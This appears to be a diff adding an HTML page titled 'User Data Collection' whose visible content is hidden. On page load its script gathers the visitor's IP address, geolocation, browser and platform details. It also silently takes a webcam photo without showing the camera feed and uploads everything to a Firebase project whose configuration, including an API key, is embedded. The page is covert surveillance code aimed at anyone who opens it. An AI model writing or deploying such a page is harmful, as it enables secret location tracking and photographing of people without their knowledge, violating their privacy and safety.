@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Data Collection</title>
+</head>
+<body>
+
+    <!-- Hidden UI -->
+    <div style="display: none;">
+        Collecting data...
+    </div>
+
+    <!-- Firebase SDK Modular Version -->
+    <script type="module">
+        // Import Firebase SDK modules
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
+        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js';
+        import { getStorage, ref, uploadString, getDownloadURL } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-storage.js';
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCVnCCy2tFBgxB52NWKrOYFWTwFnClUT4w",
+            authDomain: "sidexp-c5abe.firebaseapp.com",
+            projectId: "sidexp-c5abe",
+            storageBucket: "sidexp-c5abe.appspot.com",
+            messagingSenderId: "1008048850973",
+            appId: "1:1008048850973:web:e61765f89e8d67bb3b5ef4",
+            measurementId: "G-JLWFP4E4Y4"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const storage = getStorage(app);
+
+        // Function to collect user data
+        async function collectUserData() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                const userAgent = navigator.userAgent;
+                const osType = navigator.platform;
+
+                const userData = {
+                    ipAddress: ipAddress,
+                    locationLatitude: latitude,
+                    locationLongitude: longitude,
+                    deviceModel: "Unknown",
+                    osType: osType,
+                    browserInfo: userAgent,
+                    timestamp: new Date().toISOString(),
+                };
+
+                try {
+                    // Capture image from user's camera
+                    const imageUrl = await captureImage();
+                    userData.imageUrl = imageUrl; // Add image URL to user data
+
+                    // Add document to Firestore
+                    await addDoc(collection(db, "user_info"), userData);
+                    console.log("Document written successfully!");
+                } catch (error) {
+                    console.error("Error writing document: ", error);
+                }
+            });
+        }
+
+        // Function to capture a single image from the user's camera
+        async function captureImage() {
+            return new Promise((resolve, reject) => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                // Get video stream from user's camera (but don't display the video feed)
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        const videoTrack = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(videoTrack);
+
+                        // Capture a single frame from the video
+                        imageCapture.takePhoto()
+                            .then((blob) => {
+                                const reader = new FileReader();
+                                reader.onloadend = () => {
+                                    const imageBase64 = reader.result;
+                                    // Upload the image to Firebase Storage
+                                    const imageRef = ref(storage, 'user_photos/photo_' + Date.now() + '.jpg');
+                                    uploadString(imageRef, imageBase64, 'data_url')
+                                        .then(async (snapshot) => {
+                                            // Get the download URL of the uploaded image
+                                            const imageUrl = await getDownloadURL(imageRef);
+                                            resolve(imageUrl);
+                                        })
+                                        .catch((error) => {
+                                            reject(error);
+                                        });
+                                };
+                                reader.readAsDataURL(blob);
+                            })
+                            .catch((error) => {
+                                reject(error);
+                            })
+                            .finally(() => {
+                                // Stop the camera stream
+                                stream.getTracks().forEach(track => track.stop());
+                            });
+                    })
+                    .catch((error) => {
+                        reject(error);
+                    });
+            });
+        }
+
+        // Trigger data collection when the page loads
+        collectUserData();
+    </script>
+
+</body>
+</html>
